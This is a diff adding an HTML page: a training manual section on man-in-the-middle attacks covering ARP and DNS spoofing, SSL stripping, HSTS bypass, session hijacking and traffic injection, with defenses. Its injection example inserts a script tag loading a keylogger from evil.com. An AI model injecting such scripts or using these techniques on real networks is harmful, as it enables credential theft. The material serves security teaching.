@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description"
+        content="Section 2.4: Man-in-the-Middle Attacks - Comprehensive coverage of MITM positioning, SSL interception, session hijacking, and traffic manipulation.">
+    <title>2.4 MITM ATTACKS | MODULE 2 | FIELD MANUAL</title>
+    <link rel="stylesheet" href="../styles.css">
+</head>
+
+<body>
+    <div class="classification-banner">
+        UNCLASSIFIED // MODULE 2 // SECTION 2.4 // MITM ATTACKS
+    </div>
+
+    <header class="site-header">
+        <h1 class="site-title">Section 2.4</h1>
+        <p class="site-subtitle">Man-in-the-Middle Attacks</p>
+    </header>
+
+    <nav class="nav-main">
+        <ul class="nav-list">
+            <li><a href="../index.html" class="nav-link">HOME</a></li>
+            <li><a href="index.html" class="nav-link">MODULE 2</a></li>
+            <li><a href="layer2-attacks.html" class="nav-link">PREV: LAYER 2 ATTACKS</a></li>
+            <li><a href="mots-evil-twin.html" class="nav-link">NEXT: MOTS/EVIL TWIN</a></li>
+        </ul>
+    </nav>
+
+    <main class="container">
+        <div class="content-wrapper">
+            <nav class="breadcrumb">
+                <a href="../index.html">Home</a>
+                <span class="breadcrumb-separator">/</span>
+                <a href="index.html">Module 2</a>
+                <span class="breadcrumb-separator">/</span>
+                <span>2.4 MITM Attacks</span>
+            </nav>
+
+            <p class="section-marker">// SECTION 2.4</p>
+            <h1>Man-in-the-Middle Attacks</h1>
+
+            <!-- ============================================
+                 INTRODUCTION
+                 ============================================ -->
+            <h2>Overview</h2>
+
+            <p>
+                A <strong>Man-in-the-Middle (MITM)</strong> attack positions an adversary between two
+                communicating parties, enabling interception, inspection, and manipulation of traffic.
+                The attacker relays communications between endpoints while appearing to each party as
+                the legitimate counterpart.
+            </p>
+
+            <p>
+                MITM attacks are among the most powerful network exploitation techniques, enabling
+                credential theft, session hijacking, data exfiltration, and traffic injection. Success
+                depends on achieving and maintaining the interposition position without detection.
+            </p>
+
+            <div class="definition-block">
+                <div class="definition-term">Man-in-the-Middle Attack</div>
+                <div class="definition-desc">
+                    An attack where the adversary secretly intercepts and potentially alters communications
+                    between two parties who believe they are communicating directly with each other.
+                </div>
+            </div>
+
+            <div class="diagram">
+                MITM CONCEPTUAL MODEL:
+
+                NORMAL COMMUNICATION:
+                +----------+ +----------+
+                | ALICE |<===========================>| BOB |
+                    +----------+ Direct Communication +----------+
+
+                    MAN-IN-THE-MIDDLE:
+                    +----------+ +----------+ +----------+
+                    | ALICE |<========>| ATTACKER |<========>| BOB |
+                            +----------+ +----------+ +----------+
+                            ^ | ^
+                            | | |
+                            +-- Thinks talking | Thinks talking ---+
+                            to Bob | to Alice
+                            |
+                            Sees everything
+                            Can modify traffic
+            </div>
+
+            <!-- ============================================
+                 MITM POSITIONING
+                 ============================================ -->
+            <h2>MITM Positioning Techniques</h2>
+
+            <p>
+                Establishing a MITM position requires redirecting traffic through the attacker's system.
+                Multiple techniques exist, each with distinct advantages and requirements.
+            </p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Technique</th>
+                        <th>Layer</th>
+                        <th>Requirements</th>
+                        <th>Scope</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>ARP Spoofing</td>
+                        <td>Layer 2</td>
+                        <td>Same LAN segment</td>
+                        <td>Local network</td>
+                    </tr>
+                    <tr>
+                        <td>DNS Spoofing</td>
+                        <td>Layer 7</td>
+                        <td>DNS cache access or MITM position</td>
+                        <td>Specific domains</td>
+                    </tr>
+                    <tr>
+                        <td>DHCP Spoofing</td>
+                        <td>Layer 3</td>
+                        <td>Same LAN segment</td>
+                        <td>New DHCP clients</td>
+                    </tr>
+                    <tr>
+                        <td>ICMP Redirect</td>
+                        <td>Layer 3</td>
+                        <td>Same subnet</td>
+                        <td>Specific routes</td>
+                    </tr>
+                    <tr>
+                        <td>BGP Hijacking</td>
+                        <td>Layer 3</td>
+                        <td>BGP peering access</td>
+                        <td>Internet-wide</td>
+                    </tr>
+                    <tr>
+                        <td>Evil Twin AP</td>
+                        <td>Layer 1/2</td>
+                        <td>Wireless proximity</td>
+                        <td>Wireless clients</td>
+                    </tr>
+                    <tr>
+                        <td>Physical Tap</td>
+                        <td>Layer 1</td>
+                        <td>Physical access</td>
+                        <td>Specific link</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>ARP-Based MITM</h3>
+
+            <div class="diagram">
+                ARP-BASED MITM FLOW:
+
+                1. ATTACKER POISONS ARP CACHES:
+
+                VICTIM ATTACKER GATEWAY
+                192.168.1.10 192.168.1.99 192.168.1.1
+                AA:AA:AA:.. XX:XX:XX:.. GG:GG:GG:..
+                | | |
+                |<--"GW is at XX:XX"-------| | | |-------"Victim is at XX"-->|
+                    | | |
+
+                    RESULTING CACHES:
+                    Victim: 192.168.1.1 = XX:XX:XX (Attacker)
+                    Gateway: 192.168.1.10 = XX:XX:XX (Attacker)
+
+                    2. TRAFFIC FLOWS THROUGH ATTACKER:
+
+                    VICTIM ATTACKER GATEWAY
+                    | | |
+                    |---[HTTP Request]-------->| |
+                    | (To attacker's MAC) |---[Forward Request]------>|
+                    | | |
+                    | |<---[HTTP Response]--------| |<---[Forward Response]----| (Intercepted) | | | | 3. ATTACKER
+                        CAPABILITIES: - Record all traffic (credentials, data) - Modify requests/responses in transit -
+                        Inject malicious content - Terminate connections selectively </div>
+
+                        <h3>DNS-Based MITM</h3>
+
+                        <div class="diagram">
+                            DNS-BASED MITM:
+
+                            1. VICTIM REQUESTS DNS RESOLUTION:
+
+                            VICTIM ATTACKER DNS SERVER
+                            | | |
+                            |---"Resolve bank.com"---->| |
+                            | | |
+
+                            2. ATTACKER RESPONDS WITH MALICIOUS IP:
+
+                            | | |
+                            |<--"bank.com=10.0.0.99"-| (Attacker's server) | | (Forged DNS response) | | | | | 3. VICTIM
+                                CONNECTS TO ATTACKER: | | |---[HTTPS to 10.0.0.99]-->|
+                                | (Thinks it's bank.com) |
+                                | |
+                                | [Attacker's fake site] |
+                                | [Captures credentials] |
+                                | |
+
+                                TECHNIQUES:
+                                - DNS cache poisoning
+                                - Local DNS spoofing (requires network position)
+                                - Rogue DHCP (provide attacker's DNS server)
+                                - hosts file modification (requires endpoint access)
+                        </div>
+
+                        <!-- ============================================
+                 SSL/TLS INTERCEPTION
+                 ============================================ -->
+                        <h2>SSL/TLS Interception</h2>
+
+                        <p>
+                            Modern communications are protected by TLS encryption, requiring attackers to overcome
+                            this barrier for meaningful interception. Several techniques exist to intercept or
+                            downgrade encrypted communications.
+                        </p>
+
+                        <h3>SSL Stripping</h3>
+
+                        <p>
+                            <strong>SSL stripping</strong> downgrades HTTPS connections to HTTP by intercepting
+                            requests before encryption is established. The attacker maintains HTTPS with the
+                            server while communicating with the victim over HTTP.
+                        </p>
+
+                        <div class="diagram">
+                            SSL STRIPPING ATTACK:
+
+                            NORMAL HTTPS:
+                            VICTIM SERVER
+                            |---[HTTP: http://bank.com]--------------------->|
+                            |<--[301 Redirect: https://bank.com]-------------| |---[HTTPS:
+                                https://bank.com]------------------->|
+                                |<=============[ENCRYPTED CHANNEL]===============| SSL STRIPPING: VICTIM ATTACKER SERVER
+                                    | | | |---[HTTP: bank.com]------>| |
+                                    | |---[HTTPS: bank.com]----->|
+                                    | |<===[ENCRYPTED]==========| | | | |<--[HTTP page content]----| (Attacker decrypts)
+                                        | | (No encryption) | (Victim sees HTTP) | | | | |---[HTTP: Login creds]--->| |
+                                        | (Plaintext!) |---[HTTPS: Creds]-------->|
+                                        | | |
+
+                                        ATTACKER ACTIONS:
+                                        1. Intercept initial HTTP request
+                                        2. Server redirect to HTTPS received by attacker
+                                        3. Attacker establishes HTTPS with server
+                                        4. Attacker serves HTTP version to victim
+                                        5. Rewrites all https:// links to http://
+                                        6. Credentials submitted over HTTP (intercepted)
+                        </div>
+
+                        <h3>HSTS Bypass</h3>
+
+                        <p>
+                            <strong>HTTP Strict Transport Security (HSTS)</strong> protects against SSL stripping
+                            by requiring browsers to use HTTPS. Bypass techniques target HSTS implementation gaps.
+                        </p>
+
+                        <div class="technical-block">
+                            <div class="technical-block-title">HSTS Bypass Techniques</div>
+                            <ul>
+                                <li><strong>Subdomain Attack:</strong> Target subdomains not in HSTS preload list</li>
+                                <li><strong>Domain Homograph:</strong> Use visually similar domain (bаnk.com with
+                                    Cyrillic 'a')</li>
+                                <li><strong>NTP Attack:</strong> Manipulate time to expire HSTS cache</li>
+                                <li><strong>First Visit:</strong> Attack before HSTS header received</li>
+                                <li><strong>Strip HSTS Header:</strong> Remove header on attacker-to-victim connection
+                                </li>
+                            </ul>
+                        </div>
+
+                        <h3>TLS Interception with Rogue Certificates</h3>
+
+                        <div class="diagram">
+                            TLS INTERCEPTION (Requires victim to accept certificate):
+
+                            VICTIM ATTACKER SERVER
+                            | | |
+                            |---[TLS ClientHello]----->| |
+                            | |---[TLS ClientHello]----->|
+                            | |<--[ServerHello+Cert]-----| | | (Legit cert) | |<--[ServerHello+Cert]-----| | |
+                                (Attacker's fake cert) | | | | | | [BROWSER WARNING!] | | | "Certificate not       |                          |
+     |    trusted" | | | | | | If victim clicks | | | "Continue anyway" : | | | | | |<==[Encrypted to ATK]===>|
+                                <===[Encrypted to SRV]===>|
+                                    | | |
+                                    | Attacker can read | |
+                                    | and modify all | |
+                                    | "encrypted" traffic | |
+
+                                    ENTERPRISE SCENARIO:
+                                    - Organization installs trusted CA on all devices
+                                    - Proxy generates valid certs for any domain
+                                    - No browser warnings (CA is trusted)
+                                    - All TLS traffic inspectable
+                        </div>
+
+                        <!-- ============================================
+                 SESSION HIJACKING
+                 ============================================ -->
+                        <h2>Session Hijacking</h2>
+
+                        <p>
+                            <strong>Session hijacking</strong> involves stealing or reusing an authenticated
+                            session, allowing the attacker to impersonate a legitimate user without knowing
+                            their credentials.
+                        </p>
+
+                        <h3>Cookie Theft</h3>
+
+                        <div class="diagram">
+                            SESSION COOKIE HIJACKING:
+
+                            1. VICTIM AUTHENTICATES:
+
+                            VICTIM SERVER
+                            |---[Login: user/pass]-------------------------->|
+                            |<--[Set-Cookie: session=abc123]-----------------| | | 2. ATTACKER INTERCEPTS COOKIE (via
+                                MITM): VICTIM ATTACKER SERVER |---[Request + Cookie]---->| |
+                                | Cookie: session=abc123 | |
+                                | | |
+                                | [CAPTURED] | |
+                                | | |
+
+                                3. ATTACKER USES STOLEN COOKIE:
+
+                                ATTACKER SERVER
+                                | |
+                                |---[Request]------------->|
+                                | Cookie: session=abc123 |
+                                | |
+                                |<--[Authenticated!]-------| | (As victim) | | | COOKIE THEFT VECTORS: - Network
+                                    sniffing (unencrypted HTTP) - MITM position - Cross-Site Scripting (XSS) -
+                                    Malware/browser compromise - Physical access (browser storage) </div>
+
+                                    <h3>Session Token Prediction</h3>
+
+                                    <div class="technical-block">
+                                        <div class="technical-block-title">Session Token Attack Vectors</div>
+                                        <table>
+                                            <thead>
+                                                <tr>
+                                                    <th>Attack</th>
+                                                    <th>Weakness Exploited</th>
+                                                </tr>
+                                            </thead>
+                                            <tbody>
+                                                <tr>
+                                                    <td>Prediction</td>
+                                                    <td>Sequential or predictable token generation</td>
+                                                </tr>
+                                                <tr>
+                                                    <td>Brute Force</td>
+                                                    <td>Short token length, no rate limiting</td>
+                                                </tr>
+                                                <tr>
+                                                    <td>Fixation</td>
+                                                    <td>Session ID accepted from URL/form</td>
+                                                </tr>
+                                                <tr>
+                                                    <td>Replay</td>
+                                                    <td>Token reusable after logout</td>
+                                                </tr>
+                                            </tbody>
+                                        </table>
+                                    </div>
+
+                                    <!-- ============================================
+                 TRAFFIC MANIPULATION
+                 ============================================ -->
+                                    <h2>Traffic Manipulation</h2>
+
+                                    <p>
+                                        Beyond passive interception, MITM positions enable active manipulation of
+                                        traffic
+                                        in transit. This includes content injection, response modification, and
+                                        selective
+                                        blocking.
+                                    </p>
+
+                                    <div class="diagram">
+                                        TRAFFIC INJECTION:
+
+                                        1. VICTIM REQUESTS LEGITIMATE PAGE:
+
+                                        VICTIM ATTACKER SERVER
+                                        |---[GET /page.html]------>|---[Forward]------------->|
+                                        | |<--[HTML Response]--------| | | | 2. ATTACKER MODIFIES RESPONSE: Original
+                                            HTML: <html>
+
+                                            <body>
+                                                <p>Welcome to our site!</p>
+                                            </body>
+
+</html>
+
+Modified HTML:
+<html>
+
+<body>
+    <p>Welcome to our site!</p>
+    <script src="http://evil.com/keylogger.js"></script>
+</body>
+
+</html>
+
+3. VICTIM RECEIVES MODIFIED PAGE:
+
+|<--[Modified HTML]--------| | | | | | Browser loads | | | attacker's script | | | | | INJECTION TECHNIQUES: -
+    JavaScript injection (keyloggers, cryptominers) - iframe injection (phishing overlay) - Download replacement
+    (malware substitution) - Form action modification (credential theft) - Content modification (false information)
+    </div>
+
+    <div class="technical-block">
+        <div class="technical-block-title">MITM Traffic Manipulation Capabilities</div>
+        <ul>
+            <li><strong>Content Injection:</strong> Add malicious scripts, iframes, or content</li>
+            <li><strong>Response Modification:</strong> Alter server responses before delivery</li>
+            <li><strong>Request Modification:</strong> Change requests (parameters, headers)</li>
+            <li><strong>Selective Blocking:</strong> Drop specific requests or responses</li>
+            <li><strong>Download Swapping:</strong> Replace legitimate files with malware</li>
+            <li><strong>DNS Response Manipulation:</strong> Redirect to attacker-controlled servers</li>
+        </ul>
+    </div>
+
+    <!-- ============================================
+                 MITM DETECTION AND DEFENSE
+                 ============================================ -->
+    <h2>Detection and Defense</h2>
+
+    <table>
+        <thead>
+            <tr>
+                <th>Defense</th>
+                <th>Protection</th>
+                <th>Limitation</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td>TLS/SSL (properly implemented)</td>
+                <td>Encrypts traffic, authenticates server</td>
+                <td>SSL stripping, compromised CA</td>
+            </tr>
+            <tr>
+                <td>HSTS</td>
+                <td>Enforces HTTPS</td>
+                <td>First visit vulnerable, subdomains</td>
+            </tr>
+            <tr>
+                <td>Certificate Pinning</td>
+                <td>Accepts only specific certificates</td>
+                <td>Operational complexity, backup certs</td>
+            </tr>
+            <tr>
+                <td>VPN</td>
+                <td>Encrypts all traffic through tunnel</td>
+                <td>Trust shifted to VPN provider</td>
+            </tr>
+            <tr>
+                <td>Network Monitoring</td>
+                <td>Detect ARP anomalies, duplicate MACs</td>
+                <td>Detection only, not prevention</td>
+            </tr>
+            <tr>
+                <td>DAI/DHCP Snooping</td>
+                <td>Prevent ARP/DHCP attacks</td>
+                <td>Requires switch support</td>
+            </tr>
+        </tbody>
+    </table>
+
+    <!-- ============================================
+                 SECTION SUMMARY
+                 ============================================ -->
+    <h2>Section Summary</h2>
+
+    <p>
+        This section covered Man-in-the-Middle attack techniques:
+    </p>
+
+    <ul>
+        <li>MITM positioning: ARP, DNS, DHCP, and other techniques</li>
+        <li>SSL/TLS interception: SSL stripping, HSTS bypass, rogue certificates</li>
+        <li>Session hijacking: cookie theft, token attacks</li>
+        <li>Traffic manipulation: injection, modification, blocking</li>
+        <li>Defenses: TLS, HSTS, certificate pinning, network controls</li>
+    </ul>
+
+    <div class="technical-block">
+        <div class="technical-block-title">Key Takeaways</div>
+        <ul>
+            <li>MITM requires establishing network position first</li>
+            <li>SSL stripping defeats encryption by preventing its use</li>
+            <li>Proper TLS implementation is primary defense</li>
+            <li>Active manipulation more dangerous than passive sniffing</li>
+            <li>Multiple positioning techniques may be combined</li>
+        </ul>
+    </div>
+
+    <h2>Navigation</h2>
+    <p>
+        <a href="layer2-attacks.html" class="nav-link" style="display: inline-block;">RETURN TO SECTION 2.3</a>
+        <span style="margin: 0 1rem; color: var(--text-muted);">|</span>
+        <a href="mots-evil-twin.html" class="nav-link" style="display: inline-block;">PROCEED TO SECTION 2.5: MOTS/EVIL
+            TWIN</a>
+    </p>
+    </div>
+    </main>
+
+    <footer class="site-footer">
+        <p class="footer-text">
+            Section 2.4: Man-in-the-Middle Attacks // Module 2 // Field Manual<br>
+            Classification: Unclassified
+        </p>
+    </footer>
+    </body>
+
+    </html>
